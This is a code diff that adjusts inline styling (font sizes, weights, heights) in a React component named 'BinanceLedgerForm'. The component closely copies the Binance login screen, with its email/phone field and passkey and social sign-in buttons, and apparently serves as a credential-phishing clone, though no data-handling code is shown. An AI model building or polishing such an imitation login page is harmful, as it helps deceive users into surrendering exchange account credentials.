@@ -17,7 +17,8 @@ const BinanceLedgerForm: FC = () => {
       style={{
         background: "var(--color-BasicBg, #181A20)",
         fontFamily: "BinanceNova, Arial, sans-serif",
-        color: "var(--color-PrimaryText, #EAECEF)"
+        color: "var(--color-PrimaryText, #EAECEF)",
+        fontSize: "14px"
       }}
     >
       <div 
@@ -51,12 +52,15 @@ const BinanceLedgerForm: FC = () => {
         {/* Header with QR Code Icon */}
         <div className="flex justify-between items-center mb-8">
           <div 
-            className="card-page-title !mb-[0px] text-2xl font-semibold" 
+            className="card-page-title !mb-[0px]" 
             role="heading" 
             aria-level={1}
             style={{ 
               color: "var(--color-PrimaryText, #EAECEF)",
-              fontFamily: "BinanceNova, Arial, sans-serif"
+              fontFamily: "BinanceNova, Arial, sans-serif",
+              fontSize: "24px",
+              fontWeight: "600",
+              lineHeight: "32px"
             }}
           >
             Log in
@@ -95,11 +99,14 @@ const BinanceLedgerForm: FC = () => {
         <form onSubmit={handleSubmit}>
           <div className="bn-formItem mb-6">
             <label 
-              className="bn-formItem-label block mb-2 text-sm font-medium" 
+              className="bn-formItem-label block mb-2" 
               htmlFor="bn-formItem-q8nY2Y1v"
               style={{ 
                 color: "var(--color-PrimaryText, #EAECEF)",
-                fontFamily: "BinanceNova, Arial, sans-serif"
+                fontFamily: "BinanceNova, Arial, sans-serif",
+                fontSize: "14px",
+                fontWeight: "400",
+                lineHeight: "20px"
               }}
             >
               Email/Phone number
@@ -126,7 +133,10 @@ const BinanceLedgerForm: FC = () => {
                     className="bn-textField-input !w-[inherit] bg-transparent border-0 text-white p-3 w-full outline-none placeholder-[#848E9C]"
                     style={{ 
                       color: "var(--color-PrimaryText, #EAECEF)",
-                      fontFamily: "BinanceNova, Arial, sans-serif"
+                      fontFamily: "BinanceNova, Arial, sans-serif",
+                      fontSize: "14px",
+                      fontWeight: "400",
+                      lineHeight: "20px"
                     }}
                     spellCheck="false"
                     autoComplete="username"
@@ -139,11 +149,15 @@ const BinanceLedgerForm: FC = () => {
           </div>
 
           <button
-            className="bn-button bn-button__primary data-size-large mt-6 w-full py-3 rounded font-semibold transition-colors"
+            className="bn-button bn-button__primary data-size-large mt-6 w-full py-3 rounded transition-colors"
             style={{
               backgroundColor: "var(--color-BtnBg, #FCD535)",
               color: "var(--color-TextOnYellow, #202630)",
-              fontFamily: "BinanceNova, Arial, sans-serif"
+              fontFamily: "BinanceNova, Arial, sans-serif",
+              fontSize: "14px",
+              fontWeight: "500",
+              lineHeight: "20px",
+              height: "48px"
             }}
             type="submit"
             aria-label="Next"
@@ -159,10 +173,13 @@ const BinanceLedgerForm: FC = () => {
             style={{ backgroundColor: "var(--color-Line, #2B3139)" }}
           />
           <div 
-            className="px-4 text-sm"
+            className="px-4"
             style={{ 
               color: "var(--color-TertiaryText, #848E9C)",
-              fontFamily: "BinanceNova, Arial, sans-serif"
+              fontFamily: "BinanceNova, Arial, sans-serif",
+              fontSize: "14px",
+              fontWeight: "400",
+              lineHeight: "20px"
             }}
           >
             or
@@ -182,7 +199,11 @@ const BinanceLedgerForm: FC = () => {
               backgroundColor: "transparent",
               border: "1px solid var(--color-InputLine, #474D57)",
               color: "var(--color-PrimaryText, #EAECEF)",
-              fontFamily: "BinanceNova, Arial, sans-serif"
+              fontFamily: "BinanceNova, Arial, sans-serif",
+              fontSize: "14px",
+              fontWeight: "400",
+              lineHeight: "20px",
+              height: "48px"
             }}
             role="button" 
             aria-label="Continue with Passkey"
@@ -211,7 +232,11 @@ const BinanceLedgerForm: FC = () => {
               backgroundColor: "transparent",
               border: "1px solid var(--color-InputLine, #474D57)",
               color: "var(--color-PrimaryText, #EAECEF)",
-              fontFamily: "BinanceNova, Arial, sans-serif"
+              fontFamily: "BinanceNova, Arial, sans-serif",
+              fontSize: "14px",
+              fontWeight: "400",
+              lineHeight: "20px",
+              height: "48px"
             }}
             role="button" 
             aria-label="Continue with Google"
@@ -241,7 +266,11 @@ const BinanceLedgerForm: FC = () => {
               backgroundColor: "transparent",
               border: "1px solid var(--color-InputLine, #474D57)",
               color: "var(--color-PrimaryText, #EAECEF)",
-              fontFamily: "BinanceNova, Arial, sans-serif"
+              fontFamily: "BinanceNova, Arial, sans-serif",
+              fontSize: "14px",
+              fontWeight: "400",
+              lineHeight: "20px",
+              height: "48px"
             }}
             role="button" 
             aria-label="Continue with Apple"
@@ -269,7 +298,11 @@ const BinanceLedgerForm: FC = () => {
               backgroundColor: "transparent",
               border: "1px solid var(--color-InputLine, #474D57)",
               color: "var(--color-PrimaryText, #EAECEF)",
-              fontFamily: "BinanceNova, Arial, sans-serif"
+              fontFamily: "BinanceNova, Arial, sans-serif",
+              fontSize: "14px",
+              fontWeight: "400",
+              lineHeight: "20px",
+              height: "48px"
             }}
             role="button" 
             aria-label="Continue with Telegram"
